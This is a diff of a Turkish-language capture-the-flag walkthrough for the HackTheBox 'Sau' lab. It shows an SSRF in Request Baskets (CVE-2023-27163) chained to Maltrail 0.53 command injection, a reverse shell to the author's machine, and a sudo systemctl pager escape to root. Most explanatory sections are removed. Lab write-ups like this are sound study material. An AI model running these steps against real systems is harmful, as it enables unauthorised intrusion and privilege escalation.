@@ -1,10 +1,4 @@
-# HTB Sau — Writeup
-
-**Zorluk:** Easy
-**OS:** Linux (Ubuntu)
-**Hedef IP:** 10.129.229.26
-
----
+<img width="1200" height="909" alt="0_mI_qrHUTIkgbLPfs" src="https://github.com/user-attachments/assets/a5b038fb-4c6f-4003-9f04-3ff3779bbf5e" />
 
 #### About
 
@@ -12,36 +6,21 @@
 
 ---
 
-## 1. Genel Bakış
-
-Sau, HTB'nin "easy" seviye Linux kutularından biri ama zafiyet zinciri gerçekten öğretici: üç farklı sınıftan zafiyeti art arda zincirlemek gerekiyor.
-
-1. **Request Baskets 1.2.1** üzerindeki bir **SSRF** zafiyeti (CVE-2023-27163) — dışarıdan doğrudan erişilemeyen (filtrelenmiş) portlara, hedef sunucunun kendi ağ bağlamından istek attırarak ulaşma.
-2. Bu SSRF ile keşfedilen **Maltrail 0.53** servisindeki **kimlik doğrulama gerektirmeyen OS command injection** zafiyeti — doğrudan reverse shell.
-3. `sudo -l` ile ortaya çıkan bir **pager escape** zafiyeti — `systemctl status` çıktısının `less` üzerinden sayfalanması istismar edilerek root shell.
-
-Kısacası: **SSRF → filtrelenmiş port keşfi → unauthenticated RCE → sudo pager escape → root**.
-
----
-
-## 2. Keşif
+## 1. Keşif
 
 ```
 nmap -sS -A -T5 -p- 10.129.229.26
 ```
 
-| Port | Servis | Durum |
-|------|--------|-------|
-| 22 | SSH (OpenSSH 8.2p1, Ubuntu) | open |
-| 80 | HTTP | **filtered** |
-| 8338 | unknown | **filtered** |
-| 55555 | HTTP (Golang net/http server) | open |
+<img width="786" height="471" alt="nmap" src="https://github.com/user-attachments/assets/384c4511-93bd-4c61-b963-61b4881dbcc2" />
 
 Buradaki ilk dikkat çekici nokta şu: **80 ve 8338 portları filtrelenmiş** durumda, yani dışarıdan doğrudan erişilemiyor — muhtemelen bir firewall kuralı ya da sadece localhost'a bind edilmiş servisler. Açık olan tek web portu **55555**. Bu port, nmap'in servis parmak izinde `Request Baskets` başlığıyla ve bir Golang HTTP sunucusu olarak tanımlanmış.
 
 ---
 
-## 3. Request Baskets Uygulamasına İlk Bakış
+## 2. Request Baskets Uygulamasına İlk Bakış
+
+<img width="972" height="851" alt="site" src="https://github.com/user-attachments/assets/cb1f7e34-a021-4272-b670-b615a9eb3e4f" />
 
 `http://10.129.229.26:55555/` adresine gittiğimde otomatik olarak `/web` yoluna yönlendirildim. Karşıma çıkan arayüz, kendini şöyle tanıtıyordu:
 
@@ -83,11 +62,17 @@ CVE-2023-27163'ün özü şu: uygulama, kullanıcının basket'a atadığı bu *
 
 Bu zafiyeti otomatikleştiren bir PoC buldum: [rvzsec/CVE-2023-27163](https://github.com/rvzsec/CVE-2023-27163). Script'in mantığı basit: yeni bir basket oluşturuyor, forward URL'ini saldırganın verdiği hedefe ayarlıyor, sonra o basket'ın public endpoint'ine bir istek atarak sunucunun bu isteği hedefe forward etmesini tetikliyor ve dönen cevabı bize gösteriyor.
 
+<img width="1231" height="833" alt="cve2023" src="https://github.com/user-attachments/assets/804d4ef0-3d54-48c2-a6f9-cb1568a8dafc" />
+
+<img width="538" height="120" alt="serverhttp" src="https://github.com/user-attachments/assets/98a4e8b8-e935-4abe-9413-0b4f32dd2cb6" />
+
 Önce kendi makinemde basit bir HTTP sunucu ile testi doğruladım:
 
 ```
 ./exploit.sh http://10.129.229.26:55555/ http://10.10.14.187:8000/
 ```
+
+<img width="803" height="796" alt="cvetest" src="https://github.com/user-attachments/assets/709dc6f3-0312-4f74-9e49-fafe0e538268" />
 
 Script bir basket oluşturdu (`22469b`), token aldı, sonra basket'ın public path'ine (`GET /22469b`) istek attı. Karşılığında **kendi makinemdeki dizin listesini** (Kali'deki `~/` altı) HTML olarak geri aldım — yani hedef sunucu, benim verdiğim adrese gerçekten kendisi istek atmış ve cevabı bana proxy'lemiş. SSRF doğrulandı.
 
@@ -100,6 +85,9 @@ SSRF'in çalıştığını doğruladıktan sonra asıl amacım nmap'in "filtered
 ```
 ./exploit.sh http://10.129.229.26:55555/ http://127.0.0.1:80/
 ```
+
+<img width="1205" height="775" alt="80portu" src="https://github.com/user-attachments/assets/7fb96ddf-efb8-48b7-a2f5-62725da4da1b" />
+
 
 Yeni bir basket (`b15f82`) oluşturuldu, forward hedefi `127.0.0.1:80` olarak ayarlandı. Basket'ın public endpoint'ine istek attığımda karşılığında gelen response header'larında şunu gördüm:
 
@@ -114,6 +102,8 @@ Yani **80 numaralı, dışarıya kapalı port**, sunucunun kendi içinde çalı�
 ## 6. Zafiyet Analizi — Maltrail 0.53 Unauthenticated RCE
 
 Maltrail, ağ trafiğini analiz edip kötü amaçlı (malicious) trafik izlerini (trail) tespit etmeye yarayan açık kaynaklı bir güvenlik izleme aracı. Sürüm 0.53'ü araştırdığımda **kimlik doğrulama gerektirmeyen bir OS command injection** zafiyetinin bilindiğini gördüm — hazır bir exploit de mevcuttu: [spookier/Maltrail-v0.53-Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit).
+
+<img width="900" height="523" alt="maltrailcve" src="https://github.com/user-attachments/assets/d2caddf8-74c3-407a-9954-593c6b9b2aa2" />
 
 ### 6.1 Zafiyetin Kökeni
 
@@ -133,11 +123,7 @@ Ancak burada bir incelik var: Maltrail port 80'de çalışıyor ve **dışarıda
 python3 exploit.py 10.10.14.187 4444 http://10.129.229.26:55555/b15f82
 ```
 
-Script çalışırken şu satırı bastı:
-
-```
-Running exploit on http://10.129.229.26:55555/07200f/login
-```
+<img width="647" height="61" alt="bf15" src="https://github.com/user-attachments/assets/805415a2-38cf-442b-b85a-89eeb43e81e0" />
 
 Yani exploit, kendi payload'ını doğrudan Maltrail'in `/login` endpoint'ine değil, **basket'ın proxy'lediği path üzerinden** gönderiyor — istek önce Request Baskets'e gidiyor, oradan SSRF ile Maltrail'e forward ediliyor, komut orada çalışıyor ve tetiklenen reverse shell doğrudan bana bağlanıyor.
 
@@ -172,6 +158,9 @@ $ sudo -l
 User puma may run the following commands on sau:
     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
 ```
+
+<img width="757" height="324" alt="shellsudol" src="https://github.com/user-attachments/assets/78c790a3-287d-43e7-8fff-e8acd356f7f6" />
+
 
 `puma` kullanıcısı, şifresiz olarak **sadece** `systemctl status trail.service` komutunu root yetkisiyle çalıştırabiliyor. İlk bakışta zararsız görünüyor — sonuçta sadece bir servisin durumunu okumaya izin veriyor gibi duruyor. Ama burada klasik ve çok bilinen bir **pager escape** zafiyeti var.
 
@@ -208,47 +197,8 @@ Bu, `less`'e "bu komutu bir shell üzerinden çalıştır" dedirtti. `less` zate
 root@sau:/opt/maltrail#
 ```
 
-Root shell elde edildi.
+Root shell elde edildi. Şimdi flagleri alalım 
 
----
+<img width="306" height="107" alt="userflag" src="https://github.com/user-attachments/assets/6643519f-0fea-4a92-89ca-c710f908e804" />
 
-## 8. Sonuç
-
-`puma` kullanıcısının `user.txt` flag'i ile `root` kullanıcısının `root.txt` flag'i, standart konumlarından (`/home/puma/user.txt` ve `/root/root.txt`) okunarak kutu tamamlandı.
-
----
-
-## 9. Kök Neden Analizi
-
-| Bulgu | Kök Neden | Etki |
-|-------|-----------|------|
-| CVE-2023-27163 (Request Baskets SSRF) | Basket'a atanan forward/proxy URL'inin doğrulanmadan (whitelist/blacklist kontrolü olmadan) kullanılması | Sunucunun kendi ağ bağlamından keyfi adreslere istek attırılabilmesi, filtrelenmiş portların keşfi |
-| Maltrail 0.53 unauthenticated command injection | Login akışındaki `username` parametresinin komut satırına sanitize edilmeden aktarılması | Kimlik doğrulama gerekmeden doğrudan RCE |
-| Sudo pager escape (`systemctl status`) | `sudoers` yapılandırmasının, komutun tetiklediği alt programları (pager) hesaba katmaması | Sınırlı görünen bir sudo izninden doğrudan root shell'e çıkılması |
-
-**Düzeltme önerileri (remediation):**
-
-1. Request Baskets **son sürüme** güncellenmeli; CVE-2023-27163 sonrasında forward URL doğrulaması eklenen sürümler tercih edilmeli.
-2. Dışarıya açık olmayan servisler (Maltrail gibi) yalnızca ihtiyaç duyulan ağ segmentlerine bağlanmalı; SSRF'e karşı ek önlem olarak uygulama seviyesinde de private/loopback IP aralıklarına giden proxy istekleri reddedilmeli.
-3. Maltrail **güncel bir sürüme** yükseltilmeli — bilinen command injection zafiyeti yamalanmış sürümler kullanılmalı.
-4. `sudoers` yapılandırmasında pager kullanan komutlara (systemctl status, journalctl, git log/diff, man vb.) izin verilecekse, `SYSTEMD_PAGER=cat` gibi ortam değişkenleriyle pager devre dışı bırakılmalı ya da komutlar `--no-pager` bayrağıyla sabitlenmeli.
-5. Genel ilke: `sudo` ile verilen her izin, sadece komutun kendisini değil, **o komutun tetikleyebileceği tüm alt süreçleri** (editör, pager, shell açma potansiyeli olan her şey) göz önünde bulundurarak değerlendirilmeli — bu tür kaçışlar GTFOBins üzerinde geniş çapta dokümante edilmiştir.
-
----
-
-## 10. Zaman Çizelgesi (Timeline)
-
-1. Nmap taraması → 22 (SSH) açık, 80 ve 8338 filtrelenmiş, 55555'te Request Baskets tespiti
-2. Web arayüzünde sürüm bilgisi (`1.2.1`) görüldü, CVE-2023-27163 araştırıldı ve PoC bulundu
-3. SSRF doğrulandı — basket, saldırganın kendi HTTP sunucusuna başarıyla forward istek attı
-4. SSRF, filtrelenmiş 80 portuna yönlendirilerek arkasında **Maltrail 0.53** servisinin çalıştığı keşfedildi
-5. Maltrail 0.53 için bilinen unauthenticated command injection PoC'u bulundu
-6. Exploit, hedef olarak doğrudan Maltrail değil, onu proxy'leyen Request Baskets adresi verilerek SSRF üzerinden tetiklendi
-7. Reverse shell alındı → `puma` kullanıcısı
-8. `sudo -l` ile `systemctl status trail.service` üzerinde NOPASSWD izni tespit edildi
-9. `less` pager escape tekniğiyle (`!/bin/bash`) root shell elde edildi
-10. Kutu tamamlandı
-
----
-
-*Bu writeup eğitim ve kişisel referans amaçlıdır; HTB kullanım şartlarına uygun şekilde, yalnızca izinli/yasal lab ortamı olan Hack The Box üzerinde gerçekleştirilmiştir.*
+<img width="642" height="345" alt="ROOTFLAG" src="https://github.com/user-attachments/assets/89914e65-f711-486e-a69f-bf1bdd7f2149" />
